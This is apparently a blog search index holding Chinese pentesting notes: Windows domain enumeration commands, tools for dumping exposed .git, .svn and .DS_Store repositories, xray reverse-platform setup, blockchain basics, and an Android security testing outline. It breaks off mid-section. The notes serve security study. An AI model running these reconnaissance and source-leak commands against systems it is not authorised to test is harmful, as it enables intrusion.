<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于域信息收集</title>
      <link href="Tools/%E5%85%B3%E4%BA%8E%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
      <url>Tools/%E5%85%B3%E4%BA%8E%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#orgd21826a">DC</a><ol><li> <a href="#org1625edc">net类命令</a></li><li> <a href="#org6024d02">查看当前用户权限及SID</a></li><li><a href="#org5c9d637">查看是否存在域</a><ol><li> <a href="#org96be934">systeminfo判断</a></li><li> <a href="#orgeb67873"><code>net time /domain</code> 判断</a></li><li> <a href="#org2070906"><code>net config workstation</code> 判断</a></li></ol></li></ol></li><li><a href="#org06320c0">探测存活主机</a><ol><li> <a href="#orgcbed0df">利用ICMP协议探测</a></li></ol></li></ol><p><a id="orgd21826a"></a></p><h1 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h1><p>dns一般为域控，并且域控会开启389端口（LDAP服务）</p><p><a id="org1625edc"></a></p><h2 id="net类命令"><a href="#net类命令" class="headerlink" title="net类命令"></a>net类命令</h2><pre><code>net accounts                               # 查看本地密码策略net accounts /domain                       # 查看域密码策略net user                                   # 查看本机有哪些用户net user /domain                           # 查看当前域中所有域用户net user &lt;account-name&gt; /domain            # 查看域用户登陆时间，密码过期时间，是否有登陆脚本，所属组net time  /domain                          # 查看域时间net localgroup administrators              # 查看本机管理员账户net localgroup administrators /domain      # 查看登陆本机的域管理员账户net group /domain                          # 查看域内所有的组账户net group &quot;domain admins&quot;  /domain         # 查看域管理员用户组及成员net group &quot;domain controllers&quot;  /domain    # 查看域控列表nslookup -type=SRV _ldap._tcp.dc._msdcs.gpgc.local    # 定位域控主机名net group &quot;domain computers&quot; /domain       # 查看所有域成员计算机列表net view  /domain:gpgc.local               # 查看指定域列表nltest /domain_trusts                      # 获取域信任信息nltest /dclist:xxzx.gpgc.local             # 查看域控cmdkey /l                                     # 是否保存了登录凭证rout print                                 # 打印当前路由信息netstat -ant                               # 查看网络连接情况</code></pre><p><a id="org6024d02"></a></p><h2 id="查看当前用户权限及SID"><a href="#查看当前用户权限及SID" class="headerlink" title="查看当前用户权限及SID"></a>查看当前用户权限及SID</h2><pre><code>whoami /all用户信息----------------用户名                SID                                           ===================== ==============================================ethanhunter78bc\ethan S-1-5-21-4157029122-2371177861-4132612220-1000</code></pre><p><a id="org5c9d637"></a></p><h2 id="查看是否存在域"><a href="#查看是否存在域" class="headerlink" title="查看是否存在域"></a>查看是否存在域</h2><p><a id="org96be934"></a></p><h3 id="systeminfo判断"><a href="#systeminfo判断" class="headerlink" title="systeminfo判断"></a>systeminfo判断</h3><p>systeminfo系统信息中含有两项：Domain和Logon Server，前者为域名，后者为域控。倘若Domain为Workgroup则当前服务器不在域内</p><pre><code>systeminfo | findstr &quot;\.&quot;OS 版本:          10.0.19042 暂缺 Build 19042系统制造商:       Parallels Software International Inc.BIOS 版本:        Parallels Software International Inc. 16.1.2 (49151), 2020/12/18页面文件位置:     C:\pagefile.sys域：             xxzx.example.local                    ---&gt; 当前所在域                        DHCP 服务器: 10.147.11.71       ---&gt; DNS服务器地址                        [01]: 10.122.166.103           ---&gt; 本机地址</code></pre><p><a id="orgeb67873"></a></p><h3 id="net-time-domain-判断"><a href="#net-time-domain-判断" class="headerlink" title="net time /domain 判断"></a><code>net time /domain</code> 判断</h3><ul><li><p>  如果存在域会从域控返回时间， 并在第一行返回域控及域名</p></li><li><p>  如果当前服务器在域内但是当前用户非域用户，则会返回System error 5就表示权限不够</p></li><li><p>返回找不到域Workgroup的域控制器表示当前网络环境为工作组</p><p>  net time /domain</p></li></ul><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20210609155122windows.png" alt="img"></p><p><a id="org2070906"></a></p><h3 id="net-config-workstation-判断"><a href="#net-config-workstation-判断" class="headerlink" title="net config workstation 判断"></a><code>net config workstation</code> 判断</h3><p>其中工作域显示域名，同样若为WORKGROUP则非域环境，登录域表明当前用户是域用户登录还是本地用户登录</p><pre><code>net config workstation计算机名                     \\ETHANHUNTER78BC计算机全名                   ETHANHUNTER78BC用户名                       ethan工作站正运行于                   NetBT_Tcpip_&#123;0329A0F2-ADD9-4358-93A2-CC710202AAEF&#125; (001C42EB757D)软件版本                     Windows 10 Pro for Workstations工作站域                     XXZX //WORKGROUP为不在域内工作站域DNS名称               xxzx.example.local登录域                       XXZX     // 表面当前用户是域用户</code></pre><p><a id="org06320c0"></a></p><h1 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h1><p><a id="orgcbed0df"></a></p><h2 id="利用ICMP协议探测"><a href="#利用ICMP协议探测" class="headerlink" title="利用ICMP协议探测"></a>利用ICMP协议探测</h2><pre><code>for /L %I in (1,1,254) do @ping -w 1 -n 1 10.122.166.%I | findstr &quot;TTL=&quot;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于web目标的信息收集</title>
      <link href="Tools/%E5%85%B3%E4%BA%8Eweb%E7%9B%AE%E6%A0%87%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
      <url>Tools/%E5%85%B3%E4%BA%8Eweb%E7%9B%AE%E6%A0%87%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org075cfdf">敏感文件</a><ol><li><a href="#orgf8dd7ec">源代码  dvcs-ripper</a><ol><li> <a href="#org0f91b54">.git目录 <code>.git/config</code> 存在，漏洞存在</a></li><li> <a href="#org90cfaa2">.svn目录  <code>wc.db</code> 文件存在，漏洞存在</a></li><li> <a href="#org1207872">HG文件泄露</a></li><li> <a href="#orgaee4e71">.DS<sub>Store文件</sub>  ds<sub>store</sub><sub>exp</sub></a></li><li> <a href="#org4a16284">WEB-INF/web.xml文件</a></li></ol></li><li><a href="#orgc6edac3">备份文件</a><ol><li> <a href="#orgb46d623">网站源码备份</a></li><li> <a href="#org67c723d">gedit备份文件</a></li><li> <a href="#org400b25e">vim备份文件</a></li><li> <a href="#org05b69f5">emacs备份文件</a></li></ol></li><li> <a href="#org8a78407">常规文件</a></li><li> <a href="#org0f0b5da">fofa信息js脚本采集</a></li></ol></li><li> <a href="#org2c32552">CMS中间件 wappalyzer</a></li></ol><p><a id="org075cfdf"></a></p><h1 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h1><p><a id="orgf8dd7ec"></a></p><h2 id="源代码-dvcs-ripper"><a href="#源代码-dvcs-ripper" class="headerlink" title="源代码  dvcs-ripper"></a>源代码  <a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></h2><p><a id="org0f91b54"></a></p><h3 id="git目录-git-config-存在，漏洞存在"><a href="#git目录-git-config-存在，漏洞存在" class="headerlink" title=".git目录 .git/config 存在，漏洞存在"></a>.git目录 <code>.git/config</code> 存在，漏洞存在</h3><ul><li><p>工具 <a href="https://github.com/denny0223/scrabble">scrabble</a></p><p>  bash scrabble <a href="http://www.example.com/">http://www.example.com/</a>      # make sure target has .git folder<br>  git reset–hard HEAD^                      # HEAD 代表当前版本   HEAD^代表上一个版本<br>  git log –stat                             # 查看显示当前的HEAD和它的祖先<br>  git diff HEAD <commit-id>                  # 比较<br>  git reflog                                  # 查看所有提交记录，包括分支</p></li><li><p>工具 <a href="https://github.com/lijiejie/GitHack">lijiejie-Githack</a>    <a href="https://github.com/WangYihang/GitHacker">Githacker</a></p><pre><code>  GitHack.py http://www.openssl.org/.git/    pip3 install GitHacker  githacker --url http://127.0.0.1/.git/ --folder result</code></pre></li></ul><p><a id="org90cfaa2"></a></p><h3 id="svn目录-wc-db-文件存在，漏洞存在"><a href="#svn目录-wc-db-文件存在，漏洞存在" class="headerlink" title=".svn目录  wc.db 文件存在，漏洞存在"></a>.svn目录  <code>wc.db</code> 文件存在，漏洞存在</h3><pre><code>rip-svn.pl -v -u http://www.example.com/.svn/</code></pre><p><a id="org1207872"></a></p><h3 id="HG文件泄露"><a href="#HG文件泄露" class="headerlink" title="HG文件泄露"></a>HG文件泄露</h3><p>hg init的时候会生成.hg</p><pre><code>rip-hg.pl -v -u http://www.example.com/.hg/</code></pre><p><a id="orgaee4e71"></a></p><h3 id="DSStore文件-dsstoreexp"><a href="#DSStore文件-dsstoreexp" class="headerlink" title=".DSStore文件  dsstoreexp"></a>.DS<sub>Store文件</sub>  <a href="https://github.com/lijiejie/ds_store_exp">ds<sub>store</sub><sub>exp</sub></a></h3><p>在发布代码时未删除文件夹中隐藏的.DS<sub>store</sub>，被发现后，获取了敏感的文件名等信息。</p><pre><code>python ds_store_exp.py http://www.example.com/.DS_Store</code></pre><p><a id="org4a16284"></a></p><h3 id="WEB-INF-web-xml文件"><a href="#WEB-INF-web-xml文件" class="headerlink" title="WEB-INF/web.xml文件"></a>WEB-INF/web.xml文件</h3><ul><li>  /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li>  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li><li>  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li>  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件</li><li>  /WEB-INF/database.properties：数据库配置文件</li></ul><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><p><a id="orgc6edac3"></a></p><h2 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h2><p><a id="orgb46d623"></a></p><h3 id="网站源码备份"><a href="#网站源码备份" class="headerlink" title="网站源码备份"></a>网站源码备份</h3><p><code>www.zip/rar/tar.gz</code> </p><p><a id="org67c723d"></a></p><h3 id="gedit备份文件"><a href="#gedit备份文件" class="headerlink" title="gedit备份文件"></a>gedit备份文件</h3><p><a id="org400b25e"></a></p><h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p><a id="org05b69f5"></a></p><h3 id="emacs备份文件"><a href="#emacs备份文件" class="headerlink" title="emacs备份文件"></a>emacs备份文件</h3><p><a id="org8a78407"></a></p><h2 id="常规文件"><a href="#常规文件" class="headerlink" title="常规文件"></a>常规文件</h2><pre><code>robotx.txtreadme.md</code></pre><p><a id="org0f0b5da"></a></p><h2 id="fofa信息js脚本采集"><a href="#fofa信息js脚本采集" class="headerlink" title="fofa信息js脚本采集"></a>fofa信息js脚本采集</h2><pre><code>document.querySelectorAll(&quot;.aSpan&quot;).forEach((node)=&gt;&#123;console.log(node.innerText);&#125;)</code></pre><p><a id="org2c32552"></a></p><h1 id="CMS中间件-wappalyzer"><a href="#CMS中间件-wappalyzer" class="headerlink" title="CMS中间件 wappalyzer"></a>CMS中间件 <a href="https://github.com/AliasIO/wappalyzer">wappalyzer</a></h1><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xray配置反连平台</title>
      <link href="Tools/xray%E9%85%8D%E7%BD%AE%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0.html"/>
      <url>Tools/xray%E9%85%8D%E7%BD%AE%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org07ca632">xray独立反连平台配置</a><ol><li> <a href="#org19e459d">服务器端配置</a></li><li> <a href="#org224b658">客户端配置</a></li></ol></li></ol><p><a id="org07ca632"></a></p><h1 id="xray独立反连平台配置"><a href="#xray独立反连平台配置" class="headerlink" title="xray独立反连平台配置"></a>xray独立反连平台配置</h1><p>在 xray 中，反连平台默认不启用，因为这里面有些配置没有办法自动化，必须由人工配置完成才可使用。<br>需要反连平台才可以检测出来的漏洞包括但不限于：</p><ul><li>  ssrf</li><li>  fastjson</li><li>  s2-052</li><li>  xxe 盲打</li><li>  所有依赖反连平台的 poc</li></ul><p><a id="org19e459d"></a></p><h2 id="服务器端配置"><a href="#服务器端配置" class="headerlink" title="服务器端配置"></a>服务器端配置</h2><p>在vps上需配置 <code>config.yaml</code> 中 <strong>reverse</strong> 部分</p><pre><code># 服务端reverse:  db_file_path: &quot;reverse.db&quot;  token: &quot;please_change_me_to_a_new_token&quot;  http:    listen_ip: 0.0.0.0    listen_port: &quot;80&quot;</code></pre><p>执行如下命令</p><pre><code>./xray reverse</code></pre><p><a id="org224b658"></a></p><h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><p>在本地客户端的xray需配置 <code>config.yaml</code> 如下 <strong>reverse</strong> 部分</p><pre><code>reverse:  token: &quot;please_change_me_to_a_new_token&quot;  client:    remote_server: true    http_base_url: &quot;http://YOUR_REVERSE_SERVER_IP:80&quot;</code></pre><p>执行如下命令</p><pre><code>./xray_darwin_amd64 webscan --listen 127.0.0.1:7777  --html-output ~/Desktop/xray-report.html</code></pre><p>References:<br><a href="https://docs.xray.cool/#/scenario/burp">xray官方文档</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于区块链的认知</title>
      <link href="Evolution/%E5%85%B3%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E8%AE%A4%E7%9F%A5.html"/>
      <url>Evolution/%E5%85%B3%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E8%AE%A4%E7%9F%A5.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li> <a href="#org8c66cd0">区块链定义</a></li></ol><p><a id="org8c66cd0"></a></p><h1 id="区块链定义"><a href="#区块链定义" class="headerlink" title="区块链定义"></a>区块链定义</h1><p>区块链最核心的价值体现在 <strong>去中心化</strong> 、*不可篡改* 、*可溯源*<br>用分布式数据库技术识别、传播和记载信息的智能对等网络<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup><br>从狭义上讲通过数字货币看区块链,它既是数据结构,又是分布式账本,更是一套技术方案。</p><ul><li>  数据结构: 区块链是一种由交易数据构成的区块按时间先后顺序通过区块哈希指针相连组成的链式数据结构</li><li>  分布式账本: 区块链记录了全网发生的所有交易情况</li><li>  技术方案: 区块链构建了比特币的底层技术，保证比特币系统的正常运行</li></ul><p>从广义上讲，区块链技术使用了一种全新的分布式基础架构和计算方式</p><ol><li> 利用链式结构保证数据的完整性，并存储数据;</li><li> 利用密码学来保证数据的可靠性,以及数据的传输和访问安全;</li><li> 利用分布式节点独立运行统一的共识算法来获取数据的记录权，进而更新存储的数据，实现可信任的数据共享;</li><li> 利用智能合约里面的代码自动操作数据，进而保证合约执行不受外界干扰。</li></ol><p>保证隐私的技术🔐-加密</p><ul><li><p>对称(私钥)加密: 加解密互为逆操作,私钥加密，私钥解密<br>  常见的对称加密算法有DES、3DES、AES、Blowfish、IDEA、RC5、RC6</p></li><li><p>非对称加密: 公钥和私钥互为加解密工具，不能x钥加密，x钥解密。私钥可以计算出公钥<br>  公钥加密,私钥签名</p></li></ul><p>数字世界的身份证🆔-哈希<br>哈希算法是将文件映射为较短的固定长度字符串(哈希值)</p><p>相同文件哈希值相同，不可逆推，计算极快</p><p>数字签名: 抗抵赖、不可伪造、可轻松识别</p><p><a href="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220131104740.png">签名、加解密过程</a></p><p>Centralized &#x2013;&gt; Distributed &#x2013;&gt; Decentralized &#x2013;&gt; P2P(拥有一定共识，动力来自底层节点，没有第三方中心节点的统一指挥)</p><p>CAP定理: 在分布式系统中,必然无法同时满足一致性(consistency)、可用性(Availability)、分区容忍性(Partition Tolerance), CAP三者最多得其二</p><h1 id="Footnotes"><a href="#Footnotes" class="headerlink" title="Footnotes"></a>Footnotes</h1><p><sup><a id="fn.1" href="#fnr.1">1</a></sup> 互联网是基于TCP/IP协议搭建起来的，而区块链的P2P网络依然使用的是TCP/IP协议，所以区块链是基于互联网的，它在互联网的基础上实现叠加和升级，是互联网的高级形态</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Evolution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Android软件测试基础</title>
      <link href="Evolution/Android%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80.html"/>
      <url>Evolution/Android%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#orgef93074">Android App安全基础</a><ol><li> <a href="#org6a476ce">Android APP生成过程</a></li><li><a href="#orgd65fb7b">安全测试工具</a><ol><li> <a href="#orge8f77e9">静态分析工具 - 测试App是否存在防反编译和防篡改的问题</a></li><li> <a href="#orgb66f7e9">动态分析工具 - 测试防调试、防注入、防内存转储、漏洞测试等问题</a></li><li> <a href="#org871ae98">数据包分析工具- 测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞</a></li><li> <a href="#org703824e">挂钩工具 - 解决加密时上述工具无法使用的问题</a></li></ol></li><li> <a href="#org6e514a2">App相关的信息资产</a></li></ol></li><li><a href="#org8721875">程序代码安全测试 - APP文件、程序进程</a><ol><li> <a href="#orgdcbf70e">运行环境测试</a></li><li><a href="#orge5164c6">防反编译测试</a><ol><li> <a href="#org8b4c3f1">反编译工具检测</a></li><li> <a href="#orge6edb94">代码混淆检测</a></li><li> <a href="#org241f12f">混淆强度检测</a></li><li> <a href="#org086bde5">关键代码(敏感逻辑和数据保护)检测</a></li></ol></li><li><a href="#org69ea40d">防篡改测试</a><ol><li> <a href="#orgb74ed5b">程序文件防篡改检测</a></li></ol></li><li><a href="#orgcd438a0">防调试测试</a><ol><li> <a href="#org0692e69">调试工具防护检测</a></li><li> <a href="#org4816187">调试行为防护检测</a></li><li> <a href="#org103f672">内存防护检测</a></li></ol></li><li><a href="#org6e4485b">防注入测试</a><ol><li> <a href="#org0649028">进程防护检测</a></li></ol></li></ol></li><li><a href="#org98765cf">服务交互安全测试 - 程序进程、前段界面、接口端口</a><ol><li><a href="#org6bdf04a">进程间交互</a><ol><li> <a href="#org7012d36">检测目的</a></li><li> <a href="#orge4d99d8">检测方法</a></li><li> <a href="#org0f48c98">检测结论</a></li><li> <a href="#org0829600">修复建议</a></li></ol></li><li><a href="#org5a97a7a">屏幕交互</a><ol><li> <a href="#org5bcf1f3">界面劫持检测</a></li><li> <a href="#org41702b1">防截/录屏检测</a></li></ol></li><li><a href="#org5f9f4dc">WebView交互</a><ol><li> <a href="#org8205a3e">克隆攻击检测</a></li><li> <a href="#orgceee83d">WebView安全检测</a></li></ol></li><li><a href="#org8fb541b">接口端口交互</a><ol><li> <a href="#org4a7dda8">对象反序列化检测</a></li><li> <a href="#org6df9c6d">Wormhole漏洞检测</a></li></ol></li></ol></li><li><a href="#org414f599">鉴权认证安全测试 - 接口端口、内存数据、网络通信</a><ol><li><a href="#orgf61b415">注册过程测试</a><ol><li> <a href="#orge9b7dc3">注册信息保护检测</a></li><li> <a href="#org61850ac">注册信息传输检测</a></li><li> <a href="#org155ab47">注册过程防爆破检测</a></li><li> <a href="#org0f50b35">注册过程防嗅探检测</a></li></ol></li><li><a href="#org1371bd6">登陆过程测试</a><ol><li> <a href="#orga447a0e">密码安全验证检测</a></li><li> <a href="#orgf9ae294">登陆信息加密传输检测</a></li><li> <a href="#org5300a15">登陆过程防爆破检测</a></li><li> <a href="#org771fe4a">登陆过程防嗅探检测</a></li><li> <a href="#orgbc121bd">登陆过程防绕过检测</a></li><li> <a href="#orgabc9a4b">加强认证检测</a></li></ol></li><li><a href="#orgfefe1c8">会话过程测试</a><ol><li> <a href="#orgf7b44a1">有状态会话标志检测</a></li><li> <a href="#org9be6f93">无状态会话Token检测</a></li><li> <a href="#org1ce3ca7">会话不活跃检测</a></li><li> <a href="#org71ebb3f">加强认证检测</a></li></ol></li><li><a href="#org783c152">登出过程测试</a><ol><li> <a href="#orga37a056">会话终止检测</a></li><li> <a href="#org22db691">残留数据检测</a></li></ol></li><li><a href="#org13ec53d">注销过程测试</a><ol><li> <a href="#org643d8f5">重新注册检测</a></li><li> <a href="#org0942197">数据清除检测</a></li></ol></li></ol></li><li><a href="#org8c9cd3a">本地数据安全测试 - 内存数据、本地存储</a><ol><li><a href="#org0bb8c18">数据创建测试</a><ol><li> <a href="#org2f44160">用户协议检测</a></li><li> <a href="#orgba2f37e">数据采集检测</a></li><li> <a href="#orga315219">数据输入检测</a></li><li> <a href="#orga14671a">数据生成检测</a></li></ol></li><li><a href="#org0e9c3ed">数据存储测试</a><ol><li> <a href="#org9fc890b">访问控制检测</a></li><li> <a href="#org717a8be">数据加密检测</a></li></ol></li><li><a href="#org80440e9">数据处理测试</a><ol><li> <a href="#org428e884">程序日志检测</a></li><li> <a href="#orge80508d">敏感数据不当使用检测</a></li></ol></li><li><a href="#org203f9e0">数据共享测试</a><ol><li> <a href="#orgdcc9854">第三方SDK用户协议检测</a></li><li> <a href="#org4e8592a">与第三方SDK数据共享检测</a></li></ol></li><li><a href="#orgdbf7381">数据备份测试</a><ol><li> <a href="#orgbd332d3">敏感数据备份检测</a></li><li> <a href="#org1c7a1d8">备份数据加密强度检测</a></li></ol></li><li><a href="#org1c83575">数据销毁测试</a><ol><li> <a href="#org8a07238">后台运行数据检测</a></li><li> <a href="#org57b8027">敏感数据清除检测</a></li></ol></li></ol></li><li><a href="#org3894cd3">网络传输安全测试 - 网络通信</a><ol><li><a href="#org2412456">安全传输层测试</a><ol><li> <a href="#orgefeec07">TLS实现检测</a></li><li> <a href="#orgfb44226">CA证书检测</a></li><li> <a href="#org090d933">证书校验检测</a></li><li> <a href="#org467e66d">主机名校验</a></li></ol></li><li><a href="#org764d1f9">数据加密检测</a><ol><li> <a href="#org9f7544e">检测目的</a></li><li> <a href="#orgb800ad3">检测方法</a></li><li> <a href="#orgbdb1f45">检测结论</a></li><li> <a href="#orgace36cd">修复建议</a></li></ol></li><li><a href="#org30371d5">中间人攻击测试</a><ol><li> <a href="#orgb561cf4">HTTP中间人会话劫持检测</a></li><li> <a href="#org493ff20">HTTPS中间人会话劫持检测</a></li></ol></li></ol></li><li> <a href="#org5b71f45">App加固技术</a></li></ol><p><a id="orgef93074"></a></p><h1 id="Android-App安全基础"><a href="#Android-App安全基础" class="headerlink" title="Android App安全基础"></a>Android App安全基础</h1><p><a id="org6a476ce"></a></p><h2 id="Android-APP生成过程"><a href="#Android-APP生成过程" class="headerlink" title="Android APP生成过程"></a>Android APP生成过程</h2><pre><code>graph LR    java[.java文件] --&gt;|javac|cls[.class文件]    cls[.class文件] --&gt; dx[dx]    jar[.jar文件] --&gt; dx[dx]    dx[dx] --&gt; dex[class.dex]    dex[class.dex] --&gt;|dex2oat| oat[oat格式的class.dex文件]    dex[class.dex] --&gt;aapt[aapt]    resource[resource] --&gt;aapt[aapt]    aapt --&gt; .apk文件    .apk文件 --&gt; jarsigner     jarsigner--&gt; zipalign    zipalign --&gt; signsign[signed .apk文件]</code></pre><ol><li> 通过<del>javac</del> 将java源代码生成字节码.class文件</li><li>通过<del>dx &#x2013;dex &#x2013;output=class.dex Test.class</del>将.class文件和jar包生成Android App可执行文件class.dex<br> oat格式文件是android系统自带的ELF文件格式，包括classes.dex文件内容，及classes.dex文件转换的机器指令，存储在<del>/data/dalbik-cache/arm/data@<a href="mailto:&#65;&#x70;&#112;&#64;&#x63;&#x6f;&#x6d;&#46;&#x64;&#101;&#109;&#111;&#x2e;&#116;&#101;&#x73;&#x74;&#x2d;&#x31;">&#65;&#x70;&#112;&#64;&#x63;&#x6f;&#x6d;&#46;&#x64;&#101;&#109;&#111;&#x2e;&#116;&#101;&#x73;&#x74;&#x2d;&#x31;</a>@test.apk@classes.dex</del></li><li> 通过<del>aapt</del>将.dex文件和其他音视频资源文件打包成.apk文件</li><li> 通过jarsigner对生成的apk文件进行数字签名，防止APP被篡改</li><li> 通过zipalign使apk文件压缩部分在字节边界上使对齐</li></ol><p><a id="orgd65fb7b"></a></p><h2 id="安全测试工具"><a href="#安全测试工具" class="headerlink" title="安全测试工具"></a>安全测试工具</h2><p><a id="orge8f77e9"></a></p><h3 id="静态分析工具-测试App是否存在防反编译和防篡改的问题"><a href="#静态分析工具-测试App是否存在防反编译和防篡改的问题" class="headerlink" title="静态分析工具 - 测试App是否存在防反编译和防篡改的问题"></a>静态分析工具 - 测试App是否存在防反编译和防篡改的问题</h3><ul><li><p><input disabled="" type="checkbox">  apktool 检测防篡改能力</p><ol><li><p>反编译</p><pre><code> java -jar apktool.jar d -f Test.apk</code></pre></li><li><p>重打包</p><pre><code> java -jar apktool.jar b -f directory_name -o Test.apk java -jar signapk.jar testkey.x509.pem testkey.pk8   old.apk new.apk</code></pre></li></ol></li><li><p><input disabled="" type="checkbox">  baksmali  作用 classes.dex -反编译-&gt; smali</p><pre><code>  java -jar  baksmali.jar  classes.dex  -o smalifile</code></pre></li><li><p><input disabled="" type="checkbox">  smail 作用 smali &#x2013;&gt; classes.dex</p><pre><code>  java -jar smali.jar smalifile -o classes.dex</code></pre></li><li><p><a href="https://github.com/pxb1988/dex2jar">dex2jar</a>  作用 dex &#x2013;&gt; jar</p><pre><code>  sh d2j-dex2jar.sh -f ~/path/to/apk_to_decompile.apk</code></pre></li><li><p>  [ ] jd-gui 作用 展示jar包中源码</p></li><li><p>  [ ] <a href="https://bbs.pediy.com/thread-259895.htm">jeb</a> 用于逆向工程/审计apk文件的反编译工具</p></li></ul><p><a id="orgb66f7e9"></a></p><h3 id="动态分析工具-测试防调试、防注入、防内存转储、漏洞测试等问题"><a href="#动态分析工具-测试防调试、防注入、防内存转储、漏洞测试等问题" class="headerlink" title="动态分析工具 - 测试防调试、防注入、防内存转储、漏洞测试等问题"></a>动态分析工具 - 测试防调试、防注入、防内存转储、漏洞测试等问题</h3><ul><li>  [ ] DDMS(Dalvik debug monitor service)是安卓开发环境中的Dalvik虚拟机调试监控服务</li><li>  [ ] gdb(GNU project debugger)是LInux系统的GCC调试工具</li><li>  [ ] IDA Pro 逆向神器 脱壳</li><li>  [ ] Drozer是一个进行综合安全评估的Android安全测试框架</li></ul><p><a id="org871ae98"></a></p><h3 id="数据包分析工具-测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞"><a href="#数据包分析工具-测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞" class="headerlink" title="数据包分析工具- 测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞"></a>数据包分析工具- 